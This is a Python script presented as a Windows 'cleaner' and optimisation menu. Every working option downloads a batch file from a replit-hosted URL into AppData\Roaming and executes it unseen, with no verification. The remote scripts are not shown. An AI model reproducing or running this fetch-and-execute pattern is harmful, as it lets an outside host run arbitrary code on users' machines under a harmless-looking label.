
from random import randint
from pystyle import Colors, Colorate, Center
import base64
import os
import time
import requests
import subprocess
from colorama import Fore
from pystyle import Add, Center, Anime, Colors, Colorate, Write, System





__author__ = 'dynasty' 
os.system("title PRESS ENTER")

banner = r'''

███████╗██████╗░  ░█████╗░██╗░░░░░███████╗░█████╗░███╗░░██╗███████╗██████╗░
██╔════╝██╔══██╗  ██╔══██╗██║░░░░░██╔════╝██╔══██╗████╗░██║██╔════╝██╔══██╗
█████╗░░██████╔╝  ██║░░╚═╝██║░░░░░█████╗░░███████║██╔██╗██║█████╗░░██████╔╝
██╔══╝░░██╔══██╗  ██║░░██╗██║░░░░░██╔══╝░░██╔══██║██║╚████║██╔══╝░░██╔══██╗
██║░░░░░██║░░██║  ╚█████╔╝███████╗███████╗██║░░██║██║░╚███║███████╗██║░░██║
╚═╝░░░░░╚═╝░░╚═╝  ░╚════╝░╚══════╝╚══════╝╚═╝░░╚═╝╚═╝░░╚══╝╚══════╝╚═╝░░╚═╝
by dynasty
'''
System.Size(120, 30)
System.Clear()
Anime.Fade(Center.XCenter(banner), Colors.rainbow, Colorate.Vertical, interval=0.025, enter=True)
os.system("title fr cleaner")
banner = Center.XCenter("""
ver 1.0
███████╗██████╗░  ░█████╗░██╗░░░░░███████╗░█████╗░███╗░░██╗███████╗██████╗░
██╔════╝██╔══██╗  ██╔══██╗██║░░░░░██╔════╝██╔══██╗████╗░██║██╔════╝██╔══██╗
█████╗░░██████╔╝  ██║░░╚═╝██║░░░░░█████╗░░███████║██╔██╗██║█████╗░░██████╔╝
██╔══╝░░██╔══██╗  ██║░░██╗██║░░░░░██╔══╝░░██╔══██║██║╚████║██╔══╝░░██╔══██╗
██║░░░░░██║░░██║  ╚█████╔╝███████╗███████╗██║░░██║██║░╚███║███████╗██║░░██║
╚═╝░░░░░╚═╝░░╚═╝  ░╚════╝░╚══════╝╚══════╝╚═╝░░╚═╝╚═╝░░╚══╝╚══════╝╚═╝░░╚═╝
by dynasty\n
""")

options = """
         OPTIONS\n
1.)    temp cleaner
2.)    log cleaner
3.)    disable services 
4.)    Services Optimization
5.)    battery check (laptops only)
6.)    turn on hibernate
7.)    tree (better Responsiveness)
8.)    Delete Windows Update Cache
9.)    updater
10.)   more info
11.)   exit
"""
def main():
    os.system('cls')
    print(Colorate.Vertical(Colors.blue_to_red, banner + options, 2))
    choice = input(Colors.green + 'Which option do you choose? ->  ')

    if choice == '1':
        url = "https://untimelyimpressionableadministration.blus2tlia.repl.co/temp.bat"
        r = requests.get(url)  
        username = os.getlogin()
        with open(fr"\Users\{username}\AppData\Roaming\temp.bat", 'wb') as f:
           f.write(r.content)
        subprocess.os.system(fr"\Users\{username}\AppData\Roaming\temp.bat")
        main()

    elif choice == '2':
        url = "https://untimelyimpressionableadministration.blus2tlia.repl.co/log%20cleaner.bat"
        r = requests.get(url)  
        username = os.getlogin()
        with open(fr"\Users\{username}\AppData\Roaming\log-cleaner.bat", 'wb') as f:
           f.write(r.content)
        subprocess.os.system(fr"\Users\{username}\AppData\Roaming\log-cleaner.bat")
        main()

    elif choice == "3":
        url = "https://untimelyimpressionableadministration.blus2tlia.repl.co/services.bat"
        r = requests.get(url)  
        username = os.getlogin()
        with open(fr"\Users\{username}\AppData\Roaming\services.bat", 'wb') as f:
           f.write(r.content)
        subprocess.os.system(fr"\Users\{username}\AppData\Roaming\services.bat")
        print ("done")
        main()

    elif choice == "4":
        url = "https://untimelyimpressionableadministration.blus2tlia.repl.co/optimization.bat"
        r = requests.get(url)  
        username = os.getlogin()
        with open(fr"\Users\{username}\AppData\Roaming\optimization.bat", 'wb') as f:
           f.write(r.content)
        subprocess.os.system(fr"\Users\{username}\AppData\Roaming\optimization.bat")
        print ("done")
        main()

    elif choice == '5':
        url = "https://untimelyimpressionableadministration.blus2tlia.repl.co/battery.bat"
        r = requests.get(url)  
        username = os.getlogin()
        with open(fr"\Users\{username}\AppData\Roaming\battery.bat", 'wb') as f:
           f.write(r.content)
        subprocess.os.system(fr"\Users\{username}\AppData\Roaming\battery.bat")
        print ("done")
        main()
    elif choice == '6':
        url = "https://untimelyimpressionableadministration.blus2tlia.repl.co/hibernate.bat"
        r = requests.get(url)  
        username = os.getlogin()
        with open(fr"\Users\{username}\AppData\Roaming\hibernate.bat", 'wb') as f:
           f.write(r.content)
        subprocess.os.system(fr"\Users\{username}\AppData\Roaming\hibernate.bat")
        print ("done")
        main()
    elif choice == '7':
        url = "https://untimelyimpressionableadministration.blus2tlia.repl.co/tree.bat"
        r = requests.get(url)  
        username = os.getlogin()
        with open(fr"\Users\{username}\AppData\Roaming\tree.bat", 'wb') as f:
           f.write(r.content)
        subprocess.os.system(fr"\Users\{username}\AppData\Roaming\tree.bat")
        print ("done")
        main()
    elif choice == '8':
        url = "https://untimelyimpressionableadministration.blus2tlia.repl.co/update.cmd"
        r = requests.get(url)  
        username = os.getlogin()
        with open(fr"\Users\{username}\AppData\Roaming\update.cmd", 'wb') as f:
           f.write(r.content)
        subprocess.os.system(fr"\Users\{username}\AppData\Roaming\update.cmd")
        print ("done")
        main()
    elif choice == '9':
        url = "https://untimelyimpressionableadministration.blus2tlia.repl.co/updater.bat"
        r = requests.get(url)  
        username = os.getlogin()
        with open(fr"\Users\{username}\AppData\Roaming\updater.bat", 'wb') as f:
           f.write(r.content)
        subprocess.os.system(fr"\Users\{username}\AppData\Roaming\updater.bat")
        print ("done")
        main()
    elif choice == '10':
        os.system('cls')
        print(Colors.red, "made by dynasty still in beta ver", )
        input("Press Enter to continue...")
        main()
    elif choice == '11':
       os._exit(0)  
    elif choice != ['1', '2', '3', '4', '5', '6', '7', '8', '9', '10','11' ]:
        print("That ain't an option\n")
        print("RESTARTING!!!")
        time.sleep(2)
        main()

if __author__ != 'dynasty':
    print("AN ERROR HAS OCCURED")
    os._exit(0)

main()
